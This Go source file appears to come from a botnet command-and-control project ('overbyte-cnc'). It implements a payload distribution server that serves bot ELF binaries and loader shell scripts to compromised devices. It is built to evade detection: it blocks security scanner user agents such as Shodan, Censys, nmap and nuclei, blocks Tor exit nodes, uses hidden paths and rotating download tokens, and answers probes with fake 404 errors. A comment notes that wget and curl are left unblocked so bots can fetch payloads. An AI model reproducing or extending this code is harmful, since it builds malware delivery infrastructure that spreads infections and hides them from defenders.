package payload

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"overbyte-cnc/config"
	"overbyte-cnc/logger"
)

var blockedUAPatterns = []string{
	// Real scanner UAs — wget/curl NOT blocked since actual scanners
	// (URLhaus, Shodan, Censys) use custom HTTP clients, not wget/curl.
	// Blocking wget/curl prevents legitimate bot payload downloads.
	"python-requests",
	"python-urllib",
	"go-http-client",
	"libwww-perl",
	"shodan",
	"censys",
	"zmeu",
	"nikto",
	"nmap",
	"masscan",
	"zgrab",
	"httpx",
	"nuclei",
	"gobuster",
	"dirbuster",
	"scrapy",
	"bot",
	"crawler",
	"spider",
	"scan",
}

type Server struct {
	cfg         *config.Config
	server      *http.Server
	rateLimiter map[string][]time.Time
	mu          sync.RWMutex
	tokenMgr    *TokenManager
	torBlocker  *TorBlocker
}

func NewServer(cfg *config.Config) *Server {
	return &Server{
		cfg:         cfg,
		rateLimiter: make(map[string][]time.Time),
	}
}

func (s *Server) Start() error {
	if !s.cfg.Payload.Enabled {
		return nil
	}

	// Start Tor blocker
	if s.cfg.Payload.BlockTor {
		s.torBlocker = NewTorBlocker(time.Hour)
		s.torBlocker.Start()
	}

	// Start token manager with auto-rotation
	if s.cfg.Payload.TokenEnabled {
		s.tokenMgr = NewTokenManager(s.cfg, func(token string) {
			RewriteLoader(s.cfg, token)
		})
		s.tokenMgr.Start()
	}

	port := s.cfg.Payload.Port
	if port == 0 {
		port = s.cfg.API.Port
	}

	mux := http.NewServeMux()

	// Register route with hidden path if configured
	pattern := "/payload/"
	if s.cfg.Payload.HiddenPath != "" {
		pattern = "/payload/" + s.cfg.Payload.HiddenPath + "/"
	}
	mux.HandleFunc(pattern, s.handlePayload)

	s.server = &http.Server{
		Addr:         fmt.Sprintf(":%d", port),
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 60 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	ln, err := net.Listen("tcp", s.server.Addr)
	if err != nil {
		return fmt.Errorf("failed to listen on port %d: %w", port, err)
	}

	go func() {
		logger.Info("Payload server started on port %d (path: %s)", port, pattern)
		if err := s.server.Serve(ln); err != nil && err != http.ErrServerClosed {
			logger.Error("Payload server error: %v", err)
		}
	}()

	return nil
}

func (s *Server) Stop() {
	if s.tokenMgr != nil {
		s.tokenMgr.Stop()
	}
	if s.torBlocker != nil {
		s.torBlocker.Stop()
	}
	if s.server != nil {
		s.server.Close()
	}
}

func (s *Server) handlePayload(w http.ResponseWriter, r *http.Request) {
	clientIP := s.getClientIP(r)

	// Blacklist check
	if s.checkBlacklist(clientIP) {
		logger.Warn("Blocked blacklisted IP: %s", clientIP)
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	// Rate limit
	if !s.checkRateLimit(clientIP) {
		http.Error(w, "Too Many Requests", http.StatusTooManyRequests)
		logger.Warn("Rate limit exceeded: %s", clientIP)
		return
	}

	// Tor exit node check
	if s.torBlocker != nil && s.torBlocker.IsTorExitNode(clientIP) {
		logger.Warn("Blocked Tor exit node: %s", clientIP)
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	// Scanner UA blocklist
	if s.cfg.Payload.BlockScannerUA && s.isBlockedUA(r.UserAgent()) {
		logger.Warn("Blocked scanner UA from %s: %s", clientIP, r.UserAgent())
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	// UA allowlist (existing behavior)
	if !s.checkUserAgent(r) {
		logger.Warn("Invalid User-Agent from %s: %s", clientIP, r.UserAgent())
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	// Extract path — strip hidden path prefix if configured
	prefix := "/payload/"
	if s.cfg.Payload.HiddenPath != "" {
		prefix = "/payload/" + s.cfg.Payload.HiddenPath + "/"
	}
	path := strings.TrimPrefix(r.URL.Path, prefix)

	if path == "" || strings.Contains(path, "..") || strings.Contains(path, "/") {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	isScript := strings.HasSuffix(path, ".sh")

	// Token check — required for ELF binaries, not for loader scripts
	if !isScript && s.tokenMgr != nil {
		token := r.URL.Query().Get("t")
		if !s.tokenMgr.Validate(token) {
			logger.Warn("Invalid token from %s for %s", clientIP, path)
			http.Error(w, "Not Found", http.StatusNotFound)
			return
		}
	}

	var filePath string
	if isScript {
		filePath = filepath.Join(filepath.Dir(s.cfg.Payload.BinsDirectory), path)
	} else {
		filePath = filepath.Join(s.cfg.Payload.BinsDirectory, path)
	}

	stat, err := os.Stat(filePath)
	if os.IsNotExist(err) {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}
	if err != nil || stat.IsDir() {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	file, err := os.Open(filePath)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		logger.Error("Failed to open payload file: %v", err)
		return
	}
	defer file.Close()

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", stat.Size()))
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Header().Set("X-Content-Type-Options", "nosniff")

	if _, err := io.Copy(w, file); err != nil {
		logger.Error("Failed to serve payload: %v", err)
	}

	logger.Info("Served payload %s to %s", path, clientIP)
}

func (s *Server) getClientIP(r *http.Request) string {
	directIP, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		directIP = r.RemoteAddr
	}

	// Only trust proxy headers from trusted proxies
	if s.isTrustedProxy(directIP) {
		if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
			parts := strings.Split(xff, ",")
			return strings.TrimSpace(parts[0])
		}
		if xri := r.Header.Get("X-Real-IP"); xri != "" {
			return xri
		}
	}

	return directIP
}

func (s *Server) isTrustedProxy(ip string) bool {
	for _, trusted := range s.cfg.Payload.TrustedProxies {
		if trusted == ip {
			return true
		}
		if strings.Contains(trusted, "/") {
			_, subnet, err := net.ParseCIDR(trusted)
			if err == nil && subnet.Contains(net.ParseIP(ip)) {
				return true
			}
		}
	}
	return false
}

func (s *Server) isBlockedUA(ua string) bool {
	if ua == "" {
		return true
	}
	lower := strings.ToLower(ua)
	for _, pattern := range blockedUAPatterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

func (s *Server) checkUserAgent(r *http.Request) bool {
	ua := r.UserAgent()
	expected := s.cfg.Payload.UserAgent

	if expected == "" {
		return true
	}

	return ua == expected
}

func (s *Server) checkBlacklist(ip string) bool {
	for _, blocked := range s.cfg.Payload.Blacklist {
		if blocked == ip {
			return true
		}
		if strings.Contains(blocked, "/") {
			_, subnet, err := net.ParseCIDR(blocked)
			if err == nil {
				parsedIP := net.ParseIP(ip)
				if subnet.Contains(parsedIP) {
					return true
				}
			}
		}
	}
	return false
}

func (s *Server) checkRateLimit(ip string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()

	now := time.Now()
	windowStart := now.Add(-1 * time.Minute)

	var recent []time.Time
	for _, t := range s.rateLimiter[ip] {
		if t.After(windowStart) {
			recent = append(recent, t)
		}
	}

	if len(recent) >= 60 {
		return false
	}

	s.rateLimiter[ip] = append(recent, now)
	return true
}
